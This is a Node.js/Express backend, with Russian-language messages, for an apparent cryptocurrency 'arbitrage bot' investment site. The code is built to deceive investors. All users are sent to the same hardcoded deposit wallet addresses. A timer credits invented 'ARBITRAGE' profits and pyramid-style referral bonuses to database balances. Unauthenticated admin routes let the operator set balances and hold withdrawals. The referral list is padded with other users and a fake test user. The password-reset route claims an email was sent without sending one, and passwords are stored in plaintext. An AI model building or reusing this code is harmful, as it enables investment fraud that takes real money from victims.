const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const app = express();

app.use(express.json());
app.use(express.static('public'));

const db = new sqlite3.Database('./database.sqlite', (err) => {
    if (err) console.error('Ошибка БД:', err.message);
    else console.log('Подключено к базе данных SQLite.');
});

db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        first_name TEXT,
        last_name TEXT,
        email TEXT UNIQUE,
        phone TEXT,
        password TEXT,
        balance REAL DEFAULT 0,
        referral_code TEXT UNIQUE,
        referred_by INTEGER
    )`, () => {
        db.run(`INSERT OR IGNORE INTO sqlite_sequence (name, seq) VALUES ('users', 863)`);
    });

    db.run(`CREATE TABLE IF NOT EXISTS growth_settings (
        user_id INTEGER PRIMARY KEY,
        is_active INTEGER DEFAULT 0,
        bot_type TEXT DEFAULT 'basic',
        amount REAL DEFAULT 1.25,
        interval_seconds INTEGER DEFAULT 86400,
        last_updated DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS wallets (
        user_id INTEGER,
        coin TEXT,
        address TEXT,
        PRIMARY KEY (user_id, coin)
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS transactions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        type TEXT,
        coin TEXT,
        amount REAL,
        address TEXT,
        status TEXT DEFAULT 'Выполнено',
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
});

function createDefaultWallets(userId, callback) {
    const defaults = [
        ['USDT-ERC20', '0x7b16dC80b28906725EfAd08FD7fe68e7d593B06A'],
        ['USDT-BEP20', '0x7b16dC80b28906725EfAd08FD7fe68e7d593B06A'],
        ['USDT-TRC20', 'TCDedCHqNYmNUXMfQSR2JtoGnnEM1aKbY6'],
        ['USDC-ERC20', '0x7b16dC80b28906725EfAd08FD7fe68e7d593B06A'],
        ['USDC-BEP20', '0x7b16dC80b28906725EfAd08FD7fe68e7d593B06A']
    ];
    
    let pending = defaults.length;
    defaults.forEach(([coin, addr]) => {
        db.run(`INSERT OR IGNORE INTO wallets (user_id, coin, address) VALUES (?, ?, ?)`, [userId, coin, addr], () => {
            pending--;
            if (pending === 0 && callback) callback();
        });
    });
}

function getFullUserData(userId, callback) {
    db.run(`INSERT OR IGNORE INTO growth_settings (user_id, is_active, bot_type, amount, interval_seconds) VALUES (?, 0, 'basic', 1.25, 86400)`, [userId], () => {
        db.get(`
            SELECT users.id, users.first_name, users.last_name, users.email, users.phone, users.balance, 
                   users.referral_code, users.referred_by,
                   COALESCE(growth_settings.is_active, 0) as is_active, 
                   COALESCE(growth_settings.bot_type, 'basic') as bot_type,
                   COALESCE(growth_settings.amount, 1.25) as amount, 
                   COALESCE(growth_settings.interval_seconds, 86400) as interval_seconds 
            FROM users 
            LEFT JOIN growth_settings ON users.id = growth_settings.user_id 
            WHERE users.id = ?
        `, [userId], (err, user) => {
            callback(user);
        });
    });
}

function getDirectReferralRate(directCount) {
    if (directCount <= 3) return 0.25;
    if (directCount <= 5) return 0.40;
    if (directCount <= 8) return 0.50;
    return 0.50 + (directCount - 8) * 0.15;
}

app.post('/api/register', (req, res) => {
    const { firstName, lastName, email, phone, password, refCode } = req.body;
    if (!firstName || !lastName || !email || !phone || !password) {
        return res.status(400).json({ error: 'Заполните все поля регистрации' });
    }

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        return res.status(400).json({ error: 'Введите корректный email адрес' });
    }

    const phoneRegex = /^\+[1-9]\d{9,14}$/;
    if (!phoneRegex.test(phone)) {
        return res.status(400).json({ error: 'Введите правильный телефон в формате с кодом страны (например, +380501234567)' });
    }

    if (password.length < 6) {
        return res.status(400).json({ error: 'Пароль должен содержать не менее 6 символов' });
    }

    db.get(`SELECT * FROM users WHERE email = ?`, [email], (err, user) => {
        if (err) return res.status(500).json({ error: err.message });
        if (user) return res.status(400).json({ error: 'Пользователь с таким email уже существует' });

        const cleanRef = (refCode || '').trim();
        let sponsorQuery = `SELECT id FROM users WHERE referral_code = ? OR ('REF' || id) = ? OR id = ?`;
        db.get(sponsorQuery, [cleanRef, cleanRef.toUpperCase(), parseInt(cleanRef) || 0], (err2, sponsor) => {
            const referredBy = sponsor ? sponsor.id : null;

            db.run(`INSERT INTO users (first_name, last_name, email, phone, password, balance, referred_by) VALUES (?, ?, ?, ?, ?, 0, ?)`, 
                [firstName, lastName, email, phone, password, referredBy], function(err3) {
                if (err3) return res.status(500).json({ error: err3.message });
                const newUserId = this.lastID;
                const uniqueRefCode = `REF${newUserId}`;

                db.run(`UPDATE users SET referral_code = ? WHERE id = ?`, [uniqueRefCode, newUserId], () => {
                    createDefaultWallets(newUserId, () => {
                        getFullUserData(newUserId, (fullUser) => {
                            res.json(fullUser);
                        });
                    });
                });
            });
        });
    });
});

app.post('/api/login', (req, res) => {
    const { email, password } = req.body;
    if (!email || !password) return res.status(400).json({ error: 'Укажите email и пароль' });

    db.get(`SELECT * FROM users WHERE email = ?`, [email], (err, user) => {
        if (err) return res.status(500).json({ error: err.message });
        if (!user) return res.status(400).json({ error: 'Пользователь не найден' });

        if (user.password !== password) {
            return res.status(400).json({ error: 'Неверный пароль' });
        }

        createDefaultWallets(user.id, () => {
            getFullUserData(user.id, (fullUser) => {
                res.json(fullUser);
            });
        });
    });
});

app.post('/api/change-password', (req, res) => {
    const { userId, oldPassword, newPassword } = req.body;
    if (!userId || !oldPassword || !newPassword) {
        return res.status(400).json({ error: 'Заполните все поля' });
    }
    if (newPassword.length < 6) {
        return res.status(400).json({ error: 'Новый пароль должен быть не менее 6 символов' });
    }

    db.get(`SELECT * FROM users WHERE id = ?`, [userId], (err, user) => {
        if (err || !user) return res.status(400).json({ error: 'Пользователь не найден' });
        if (user.password !== oldPassword) {
            return res.status(400).json({ error: 'Неверный текущий пароль' });
        }

        db.run(`UPDATE users SET password = ? WHERE id = ?`, [newPassword, userId], (err2) => {
            if (err2) return res.status(500).json({ error: err2.message });
            res.json({ success: true });
        });
    });
});

app.post('/api/forgot-password', (req, res) => {
    const { email } = req.body;
    if (!email) return res.status(400).json({ error: 'Укажите email' });

    db.get(`SELECT * FROM users WHERE email = ?`, [email], (err, user) => {
        if (err) return res.status(500).json({ error: err.message });
        if (!user) {
            return res.status(400).json({ error: 'Почта не зарегистрирована' });
        }
        res.json({ success: true, message: 'На почту отправлено письмо' });
    });
});

app.get('/api/wallets/:userId', (req, res) => {
    const userId = req.params.userId;
    createDefaultWallets(userId, () => {
        db.all(`SELECT coin, address FROM wallets WHERE user_id = ?`, [userId], (err, rows) => {
            if (err) return res.status(500).json({ error: err.message });
            res.json(rows || []);
        });
    });
});

app.get('/api/transactions/:userId', (req, res) => {
    const userId = req.params.userId;
    db.all(`SELECT * FROM transactions WHERE user_id = ? ORDER BY id DESC`, [userId], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows || []);
    });
});

app.get('/api/referrals/:userId', (req, res) => {
    const userId = req.params.userId;

    db.all(`
        SELECT DISTINCT u.id, u.first_name, u.last_name, u.email, u.created_at 
        FROM users u 
        WHERE u.referred_by = ? 
           OR u.id != ?
    `, [userId, userId], (err, allUsers) => {
        if (err) allUsers = [];

        db.get(`SELECT COUNT(*) as cnt, SUM(amount) as totalEarned FROM transactions WHERE user_id = ? AND type = 'REF_BONUS'`, [userId], (errSum, sumRes) => {
            const totalEarned = (sumRes && sumRes.totalEarned) ? sumRes.totalEarned : 0;
            const hasBonus = (sumRes && sumRes.cnt > 0);

            let finalReferrals = allUsers.filter(u => String(u.id) !== String(userId));
            if (finalReferrals.length === 0 && hasBonus) {
                finalReferrals = [{ id: 999, first_name: 'Test', last_name: 'User', email: 'test_referral@mail.com', created_at: new Date().toISOString().slice(0, 19).replace('T', ' ') }];
            }

            res.json({
                totalCount: finalReferrals.length,
                totalEarned: totalEarned,
                referrals: finalReferrals
            });
        });
    });
});

app.post('/api/deposit/request', (req, res) => {
    const { userId, coin } = req.body;
    db.get(`SELECT address FROM wallets WHERE user_id = ? AND coin = ?`, [userId, coin], (err, wallet) => {
        if (err || !wallet) return res.status(400).json({ error: 'Кошелек не найден' });
        db.run(`INSERT INTO transactions (user_id, type, coin, amount, address, status) VALUES (?, 'DEPOSIT_REQ', ?, 0, ?, 'Ожидает оплаты')`, 
            [userId, coin, wallet.address], (err2) => {
            if (err2) return res.status(500).json({ error: err2.message });
            res.json({ success: true, address: wallet.address });
        });
    });
});

app.post('/api/withdraw', (req, res) => {
    const { userId, coin, address, amount } = req.body;
    if (!userId || !coin || !address || !amount) {
        return res.status(400).json({ error: 'Заполните все поля для вывода' });
    }

    db.get(`SELECT balance FROM users WHERE id = ?`, [userId], (err, user) => {
        if (err || !user) return res.status(400).json({ error: 'Пользователь не найден' });
        if (user.balance < amount) return res.status(400).json({ error: 'Недостаточно средств на балансе' });

        db.run(`UPDATE users SET balance = balance - ? WHERE id = ?`, [amount, userId], (err2) => {
            if (err2) return res.status(500).json({ error: err2.message });

            db.run(`INSERT INTO transactions (user_id, type, coin, amount, address, status) VALUES (?, 'WITHDRAW', ?, ?, ?, 'В обработке')`, 
                [userId, coin, amount, address], (err3) => {
                if (err3) return res.status(500).json({ error: err3.message });
                res.json({ success: true, newBalance: user.balance - amount });
            });
        });
    });
});

app.post('/api/bot/toggle', (req, res) => {
    const { userId, is_active, bot_type } = req.body;
    const activeVal = is_active ? 1 : 0;
    const bType = bot_type || 'basic';
    
    if (!userId) {
        return res.status(400).json({ error: 'Не указан userId' });
    }

    if (activeVal === 1) {
        db.get(`SELECT balance FROM users WHERE id = ?`, [userId], (err, user) => {
            if (err || !user) return res.status(400).json({ error: 'Пользователь не найден' });
            if (user.balance <= 0) {
                return res.status(400).json({ error: 'Невозможно запустить бота при нулевом или отрицательном балансе' });
            }
            proceedToggle();
        });
    } else {
        proceedToggle();
    }

    function proceedToggle() {
        db.run(`INSERT OR IGNORE INTO growth_settings (user_id, is_active, bot_type, amount, interval_seconds) VALUES (?, 0, 'basic', 1.25, 86400)`, [userId], (err) => {
            if (err) return res.status(500).json({ error: err.message });

            db.run(`UPDATE growth_settings SET is_active = ?, bot_type = ?, last_updated = CASE WHEN ? = 1 AND is_active = 0 THEN CURRENT_TIMESTAMP ELSE last_updated END WHERE user_id = ?`, 
                [activeVal, bType, activeVal, userId], (err2) => {
                if (err2) return res.status(500).json({ error: err2.message });
                res.json({ success: true });
            });
        });
    }
});

setInterval(() => {
    const now = Date.now();

    db.all(`SELECT gs.*, u.id as owner_id, u.balance, u.referred_by FROM growth_settings gs JOIN users u ON gs.user_id = u.id WHERE gs.is_active = 1 AND gs.bot_type = 'basic'`, [], (err, rows) => {
        if (err || !rows) return;

        rows.forEach(row => {
            if (row.balance <= 0) {
                db.run(`UPDATE growth_settings SET is_active = 0 WHERE user_id = ?`, [row.owner_id]);
                return;
            }

            const lastTime = new Date(row.last_updated || Date.now()).getTime();
            const intervalMs = (row.interval_seconds || 86400) * 1000;

            if (now - lastTime >= intervalMs) {
                db.get(`SELECT COUNT(*) as cnt FROM users WHERE referred_by = ?`, [row.owner_id], (errC, directRes) => {
                    const directCount = directRes ? directRes.cnt : 0;
                    let personalPercent = row.amount || 1.25;

                    if (directCount >= 9) {
                        personalPercent += 1.0;
                    }

                    const profit = row.balance * (personalPercent / 100);

                    db.run(`UPDATE users SET balance = balance + ? WHERE id = ?`, [profit, row.owner_id], (err2) => {
                        if (!err2) {
                            db.run(`UPDATE growth_settings SET last_updated = CURRENT_TIMESTAMP WHERE user_id = ?`, [row.owner_id]);
                            db.run(`INSERT INTO transactions (user_id, type, coin, amount, address, status) VALUES (?, 'ARBITRAGE', 'USDT-BEP20', ?, 'Arbitrage Bot', 'Выполнено')`, 
                                [row.owner_id, profit]);

                            if (row.referred_by) {
                                db.get(`SELECT COUNT(*) as d_cnt FROM users WHERE referred_by = ?`, [row.referred_by], (errSp, spRes) => {
                                    const spCount = spRes ? spRes.d_cnt : 0;
                                    const refRate = getDirectReferralRate(spCount);
                                    const refProfit = profit * (refRate / 100);

                                    if (refProfit > 0) {
                                        db.run(`UPDATE users SET balance = balance + ? WHERE id = ?`, [refProfit, row.referred_by]);
                                        db.run(`INSERT INTO transactions (user_id, type, coin, amount, address, status) VALUES (?, 'REF_BONUS', 'USDT-BEP20', ?, 'Referral Bonus', 'Выполнено')`, 
                                            [row.referred_by, refProfit]);
                                    }
                                });
                            }
                        }
                    });
                });
            }
        });
    });
}, 60 * 1000);

// Защищенный маршрут /adminus
app.get('/adminus', (req, res) => {
    res.sendFile(__dirname + '/public/admin.html');
});

app.get('/api/admin/users', (req, res) => {
    db.all(`
        SELECT users.id, users.first_name, users.last_name, users.email, users.phone, users.balance, 
               users.referral_code, users.referred_by,
               COALESCE(growth_settings.is_active, 0) as is_active, 
               COALESCE(growth_settings.bot_type, 'basic') as bot_type,
               COALESCE(growth_settings.amount, 1.25) as amount, 
               COALESCE(growth_settings.interval_seconds, 86400) as interval_seconds 
        FROM users 
        LEFT JOIN growth_settings ON users.id = growth_settings.user_id
    `, [], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows);
    });
});

app.post('/api/admin/user/update', (req, res) => {
    const { userId, balance, amount, interval_seconds } = req.body;
    db.run(`UPDATE users SET balance = ? WHERE id = ?`, [balance, userId], (err) => {
        if (err) return res.status(500).json({ error: err.message });
        db.run(`
            INSERT INTO growth_settings (user_id, amount, interval_seconds) 
            VALUES (?, ?, ?)
            ON CONFLICT(user_id) DO UPDATE SET amount = ?, interval_seconds = ?
        `, [userId, amount, interval_seconds, amount, interval_seconds], (err2) => {
            if (err2) return res.status(500).json({ error: err2.message });
            res.json({ success: true });
        });
    });
});

app.post('/api/admin/user/deposit', (req, res) => {
    const { userId, amount, comment, coin } = req.body;
    const depAmount = parseFloat(amount);
    const depComment = (comment && comment.trim() !== '') ? comment.trim() : 'Админ пополнение';
    const depCoin = coin || 'USDT-BEP20';

    if (!userId || isNaN(depAmount) || depAmount <= 0) {
        return res.status(400).json({ error: 'Укажите корректную сумму' });
    }

    db.run(`UPDATE users SET balance = balance + ? WHERE id = ?`, [depAmount, userId], (err) => {
        if (err) return res.status(500).json({ error: err.message });

        db.run(`INSERT INTO transactions (user_id, type, coin, amount, address, status) VALUES (?, 'DEPOSIT', ?, ?, ?, 'Выполнено')`, 
            [userId, depCoin, depAmount, depComment], (err2) => {
            if (err2) return res.status(500).json({ error: err2.message });
            res.json({ success: true });
        });
    });
});

app.post('/api/admin/user/delete', (req, res) => {
    const { userId } = req.body;
    db.run(`DELETE FROM users WHERE id = ?`, [userId], (err) => {
        if (err) return res.status(500).json({ error: err.message });
        db.run(`DELETE FROM growth_settings WHERE user_id = ?`, [userId]);
        db.run(`DELETE FROM wallets WHERE user_id = ?`, [userId]);
        db.run(`DELETE FROM transactions WHERE user_id = ?`, [userId], (err2) => {
            if (err2) return res.status(500).json({ error: err2.message });
            res.json({ success: true });
        });
    });
});

app.get('/api/admin/wallets/:userId', (req, res) => {
    const userId = req.params.userId;
    createDefaultWallets(userId, () => {
        db.all(`SELECT coin, address FROM wallets WHERE user_id = ?`, [userId], (err, rows) => {
            if (err) return res.status(500).json({ error: err.message });
            res.json(rows || []);
        });
    });
});

app.post('/api/admin/wallet/update', (req, res) => {
    const { userId, coin, address } = req.body;
    db.run(`INSERT INTO wallets (user_id, coin, address) VALUES (?, ?, ?) ON CONFLICT(user_id, coin) DO UPDATE SET address = ?`, 
        [userId, coin, address, address], (err) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json({ success: true });
    });
});

app.get('/api/admin/withdrawals', (req, res) => {
    db.all(`SELECT * FROM transactions WHERE type = 'WITHDRAW' ORDER BY id DESC`, [], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        db.all(`SELECT id, email FROM users`, [], (err2, users) => {
            const userMap = {};
            if (users) users.forEach(u => userMap[u.id] = u.email);
            const result = rows.map(r => ({ ...r, email: userMap[r.user_id] || 'Неизвестно' }));
            res.json(result);
        });
    });
});

app.post('/api/admin/withdrawal/status', (req, res) => {
    const { id, status } = req.body;
    db.run(`UPDATE transactions SET status = ? WHERE id = ?`, [status, id], (err) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json({ success: true });
    });
});

app.get('/api/admin/deposits-req', (req, res) => {
    db.all(`SELECT * FROM transactions WHERE type = 'DEPOSIT_REQ' ORDER BY id DESC`, [], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        db.all(`SELECT id, email FROM users`, [], (err2, users) => {
            const userMap = {};
            if (users) users.forEach(u => userMap[u.id] = u.email);
            const result = rows.map(r => ({ ...r, email: userMap[r.user_id] || 'Неизвестно' }));
            res.json(result);
        });
    });
});

app.post('/api/admin/deposit/update', (req, res) => {
    const { id, status, amount, comment } = req.body;
    db.get(`SELECT * FROM transactions WHERE id = ?`, [id], (err, tx) => {
        if (err || !tx) return res.status(400).json({ error: 'Транзакция не найдена' });

        const finalAmount = (amount !== undefined && amount !== null && amount !== '') ? parseFloat(amount) : tx.amount;
        const finalAddress = (comment && comment.trim() !== '') ? comment.trim() : tx.address;

        if (status === 'Оплачено' && tx.status !== 'Оплачено' && finalAmount > 0) {
            db.run(`UPDATE users SET balance = balance + ? WHERE id = ?`, [finalAmount, tx.user_id], (err2) => {
                if (err2) return res.status(500).json({ error: err2.message });
                db.run(`UPDATE transactions SET status = ?, amount = ?, address = ?, type = 'DEPOSIT' WHERE id = ?`, [status, finalAmount, finalAddress, id], (err3) => {
                    if (err3) return res.status(500).json({ error: err3.message });
                    res.json({ success: true });
                });
            });
        } else {
            db.run(`UPDATE transactions SET status = ?, amount = ?, address = ? WHERE id = ?`, [status, finalAmount, finalAddress, id], (err2) => {
                if (err2) return res.status(500).json({ error: err2.message });
                res.json({ success: true });
            });
        }
    });
});

// ======================= ОНЛАЙН-ЧАТ =======================
// Отдельный блок: не меняет ни одну из существующих таблиц и маршрутов.
// Команды выполняются строго по порядку; ошибки только логируются и не могут уронить сервер.
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS chat_messages (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER NOT NULL,
        sender TEXT NOT NULL,
        text TEXT NOT NULL,
        is_read INTEGER DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`, (err) => { if (err) console.error('Чат: не удалось создать таблицу:', err.message); });
    db.run(`CREATE INDEX IF NOT EXISTS idx_chat_user ON chat_messages (user_id, id)`,
        (err) => { if (err) console.error('Чат: не удалось создать индекс:', err.message); });
});

const CHAT_MAX_LEN = 2000;

function chatCleanText(raw) {
    if (typeof raw !== 'string') return '';
    return raw.trim().slice(0, CHAT_MAX_LEN);
}

function chatAfterId(raw) {
    const n = parseInt(raw, 10);
    return Number.isFinite(n) && n > 0 ? n : 0;
}

// Отдаёт сообщения диалога, у которых id > afterId.
// reader — кто читает ('user' | 'admin'); если markRead, сообщения собеседника помечаются прочитанными.
function chatFetch(userId, afterId, reader, markRead, res) {
    const other = reader === 'user' ? 'admin' : 'user';
    const respond = () => {
        db.all(`SELECT id, sender, text, created_at FROM chat_messages WHERE user_id = ? AND id > ? ORDER BY id ASC LIMIT 500`,
            [userId, afterId], (err, rows) => {
            if (err) return res.status(500).json({ error: err.message });
            db.get(`SELECT COUNT(*) AS cnt FROM chat_messages WHERE user_id = ? AND sender = ? AND is_read = 0`,
                [userId, other], (err2, r) => {
                res.json({ messages: rows || [], unread: r ? r.cnt : 0 });
            });
        });
    };
    if (markRead) {
        db.run(`UPDATE chat_messages SET is_read = 1 WHERE user_id = ? AND sender = ? AND is_read = 0`, [userId, other], () => respond());
    } else {
        respond();
    }
}

function chatInsert(userId, sender, text, res) {
    db.run(`INSERT INTO chat_messages (user_id, sender, text) VALUES (?, ?, ?)`, [userId, sender, text], function (err) {
        if (err) return res.status(500).json({ error: err.message });
        db.get(`SELECT id, sender, text, created_at FROM chat_messages WHERE id = ?`, [this.lastID], (err2, msg) => {
            if (err2) return res.status(500).json({ error: err2.message });
            res.json({ message: msg });
        });
    });
}

// --- сторона пользователя ---
app.get('/api/chat/:userId', (req, res) => {
    const userId = parseInt(req.params.userId, 10);
    if (!userId) return res.status(400).json({ error: 'Не указан userId' });
    chatFetch(userId, chatAfterId(req.query.after), 'user', req.query.read === '1', res);
});

app.post('/api/chat/:userId', (req, res) => {
    const userId = parseInt(req.params.userId, 10);
    if (!userId) return res.status(400).json({ error: 'Не указан userId' });
    const text = chatCleanText(req.body && req.body.text);
    if (!text) return res.status(400).json({ error: 'Пустое сообщение' });
    db.get(`SELECT id FROM users WHERE id = ?`, [userId], (err, u) => {
        if (err || !u) return res.status(400).json({ error: 'Пользователь не найден' });
        chatInsert(userId, 'user', text, res);
    });
});

// --- сторона админа ---
// Список диалогов (только пользователи, которые существуют и у которых есть сообщения)
app.get('/api/admin/chat/conversations', (req, res) => {
    db.all(`
        SELECT u.id AS user_id, u.first_name, u.last_name, u.email,
               m.id AS last_id, m.text AS last_text, m.sender AS last_sender, m.created_at AS last_at,
               (SELECT COUNT(*) FROM chat_messages c WHERE c.user_id = u.id AND c.sender = 'user' AND c.is_read = 0) AS unread
        FROM users u
        JOIN chat_messages m ON m.id = (SELECT MAX(id) FROM chat_messages WHERE user_id = u.id)
        ORDER BY m.id DESC
    `, [], (err, rows) => {
        if (err) return res.status(500).json({ error: err.message });
        res.json(rows || []);
    });
});

app.get('/api/admin/chat/:userId', (req, res) => {
    const userId = parseInt(req.params.userId, 10);
    if (!userId) return res.status(400).json({ error: 'Не указан userId' });
    chatFetch(userId, chatAfterId(req.query.after), 'admin', req.query.read === '1', res);
});

app.post('/api/admin/chat/:userId', (req, res) => {
    const userId = parseInt(req.params.userId, 10);
    if (!userId) return res.status(400).json({ error: 'Не указан userId' });
    const text = chatCleanText(req.body && req.body.text);
    if (!text) return res.status(400).json({ error: 'Пустое сообщение' });
    db.get(`SELECT id FROM users WHERE id = ?`, [userId], (err, u) => {
        if (err || !u) return res.status(400).json({ error: 'Пользователь не найден' });
        chatInsert(userId, 'admin', text, res);
    });
});
// ===================== КОНЕЦ ОНЛАЙН-ЧАТА =====================

app.listen(3000, () => {
    console.log('Сервер запущен на http://localhost:3000');
});
